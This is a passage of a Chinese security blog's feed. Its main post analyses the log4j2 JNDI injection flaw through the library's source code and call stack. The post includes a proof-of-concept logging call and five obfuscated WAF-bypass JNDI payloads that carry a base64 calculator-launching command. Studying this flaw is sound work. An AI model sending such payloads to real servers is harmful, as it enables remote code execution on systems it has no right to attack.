class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">COWIterator</span>&lt;E&gt;(getArray(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">COWIterator</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ListIterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">COWIterator</span><span class="params">(Object[] elements, <span class="type">int</span> initialCursor)</span> &#123;</span><br><span class="line">        cursor = initialCursor;</span><br><span class="line">        snapshot = elements;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (! hasNext())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="keyword">return</span> (E) snapshot[cursor++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到CopyOnWriteArrayList的next操作并没有像Arraylist中的next一样进行对elements的直接操作，而是用了一个副本，对副本进行操作<br>也就是说，当你使用了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br></pre></td></tr></table></figure><br>获取迭代对象，后面如果再使用add操作也只会输出原先的数组的值，下面是示例代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CopyOnWriteArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line">        list.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            System.err.println(iter.next());</span><br><span class="line">        &#125;</span><br><span class="line">        System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">[1, 2, 3, 4]</span><br></pre></td></tr></table></figure><br>如果把CopyOnWriteArrayList改成ArrayList，那么就会因为next的第一行的函数checkForComodification()报错<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>CopyOnWriteArrayList能解决多线程的问题主要有三点</p><ul><li>使用了赋值以后的elements去进行迭代，并不会去直接操作原先的elements</li><li>在进行了add操作的时候进行了加锁操作</li><li>加锁完以后，会对elements复制一个新的备份，然后在新的备份加完以后再覆盖旧的</li></ul><p>以上三点最重要的还是第一点，可以自己对普通的ArrayList的add操作进行加锁实验一下，依旧会报错</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://juejin.cn/post/6844903576339218440">https://juejin.cn/post/6844903576339218440</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这两个月不知道干嘛，学工具又不想学，就开始研究tomcat的源码。&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="tomcat" scheme="http://example.com/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>log4j2 分析</title>
    <link href="http://example.com/2023/03/08/log4j2-%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/03/08/log4j2-%E5%88%86%E6%9E%90/</id>
    <published>2023-03-08T03:50:49.000Z</published>
    <updated>2023-04-19T12:38:42.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实我总感觉这应该不属于漏洞，应该是他们的正常功能，只不过恰好可以被当成漏洞来用<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup</a><br>官网也有相关的介绍，虽然这些是写到配置文件里面的<br><span id="more"></span></p><h2 id="前期配置"><a href="#前期配置" class="headerlink" title="前期配置"></a>前期配置</h2><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="trustURLCodebase"><a href="#trustURLCodebase" class="headerlink" title="trustURLCodebase"></a>trustURLCodebase</h3><p>因为漏洞核心是lookup参数可控，那么就属于jndi注入，需要低版本jdk，或者开启trustURLCodebase<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>)); </span><br></pre></td></tr></table></figure><br>当然也可以利用本地gadget，这属于jndi注入的知识，这里不做过多讨论</p><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(test.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.fatal(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1/exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">lookup:172, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:161, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">fatal:1053, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:10, test</span><br></pre></td></tr></table></figure><h3 id="MessagePatternConverter"><a href="#MessagePatternConverter" class="headerlink" title="MessagePatternConverter"></a>MessagePatternConverter</h3><p>从<br><code>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</code><br>开始看起<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>分析第二行可以知道，如果遇到<code>$&#123;</code>，就会进入判断语句，而这个workingBuilder和logger.fatal()的参数相关，换句话说，基本上workingBuilder就是logger.fatal()中的参数，只不过类型被转换了一下，原本是String，现在是StringBuilder类。<br>继续往下走，进入replace<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>来到了漏洞核心点substitue()</p><h3 id="substitue"><a href="#substitue" class="headerlink" title="substitue"></a>substitue</h3><p>接下来会逐段分析该函数中重要的代码段<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>在这里会先进行判断，如果在代码中还存在<code>$&#123;</code>，就会进入递归，在里面进行再一次解析，这段先放放，继续往下看</p><p><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/2.jpg" alt><br>在这里valueDelimiterMatcher是<code>[:,-]</code><br>也就是说如果匹配到了:-就会进入循环语句，并进行一次切割处理<br>比如aaa:-bbb，<br>前面的aaa会被赋值给varName<br>后面的值bbb会被赋值给varDefaultValue<br>接着往下走<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/3.jpg" alt><br>先不详细介绍resolveVariable，只需要知道如果是类似前面<code>aaa:-bbb</code>这样的值没什么特殊意义的值，会直接返回null，那么就会把varDefaultValue赋值给varValue，也就是bbb，而下面的代码大意就是把buf用varValue进行了部分替换<br>如果payload原本是<br><code>$&#123;jndi:ldap://127.0.0.1/$&#123;abc:-exp&#125;loit&#125;</code><br>那么就会被替换成<br><code>$&#123;jndi:ldap://127.0.0.1/exploit&#125;</code></p><p>那么回到刚刚开始那个递归的地方<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>varNameExpr就会被赋值为被替换过的payload接着解析</p><h3 id="resolveVariable"><a href="#resolveVariable" class="headerlink" title="resolveVariable"></a>resolveVariable</h3><p>接下来重点讲下resolveVariable，这里是触发jndi注入的关键<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里的resolver可以看相关文档<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a><br>进入这个lookup中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">return</span> <span class="variable">event</span> <span class="operator">=</span>= <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为会去分割<code>:</code>，那么会根据jndi取出jndi的strLookupMap，最后进行jndi调用</p><h2 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h2><p>他会根据传入的协议取出相对应的lookup，然后调用，那么就可以有如下的绕过手法<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br></pre></td></tr></table></figure></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html">http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html</a></li><li><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实我总感觉这应该不属于漏洞，应该是他们的正常功能，只不过恰好可以被当成漏洞来用&lt;br&gt;&lt;a href=&quot;https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup&quot;&gt;https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup&lt;/a&gt;&lt;br&gt;官网也有相关的介绍，虽然这些是写到配置文件里面的&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="log4j" scheme="http://example.com/tags/log4j/"/>
    
    <category term="jndi" scheme="http://example.com/tags/jndi/"/>
    
  </entry>
  
  <entry>
    <title>基于mvc框架的cms分析(没时间写)</title>
    <link href="http://example.com/2023/02/28/%E5%9F%BA%E4%BA%8Emvc%E6%A1%86%E6%9E%B6%E7%9A%84cms%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/02/28/%E5%9F%BA%E4%BA%8Emvc%E6%A1%86%E6%9E%B6%E7%9A%84cms%E5%88%86%E6%9E%90/</id>
    <published>2023-02-28T12:05:46.000Z</published>
    <updated>2023-04-19T12:39:52.199Z</updated>
    
    <content type="html"><![CDATA[<!-- ## MVC的简单理解基本上网上很多资料是有关于MVC，和类似这张图的![](1.png)其实在php中，我审计过的一两个基于MVC框架的phpcms，基本上可以通俗的理解为+ Model：与数据库相关+ Controller： 与处理相应的请求有关，也就是会牵扯到路由+ View：与html有关，就是最后渲染出来的结果## 分析路由拿到一个基于MVC框架的phpcms，首先就是要分析他的路由，也就是Controller，一般URL链接都是长这样`index.php?c=Controller&a=Action&d=do`+ c代表文件夹+ a代表文件，+ d代表文件中的函数 -->]]></content>
    
    
      
      
    <summary type="html">&lt;!-- ## MVC的简单理解
基本上网上很多资料是有关于MVC，和类似这张图的
![](1.png)
其实在php中，我审计过的一两个基于MVC框架的phpcms，基本上可以通俗的理解为
+ Model：与数据库相关
+ Controller： 与处理相应的请求有关，也就是会</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="mvc" scheme="http://example.com/tags/mvc/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-jwt</title>
    <link href="http://example.com/2022/12/05/ctfshow-jwt/"/>
    <id>http://example.com/2022/12/05/ctfshow-jwt/</id>
    <published>2022-12-04T21:02:51.000Z</published>
    <updated>2022-12-04T22:43:16.292Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>jwt一共有三部分</p><ul><li>header</li><li>payload</li><li>signature<span id="more"></span></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">header</span><br><span class="line">&#123;</span><br><span class="line">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class="line">  &#x27;alg&#x27;: &#x27;HS256&#x27;  // 加密算法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">&#123;</span><br><span 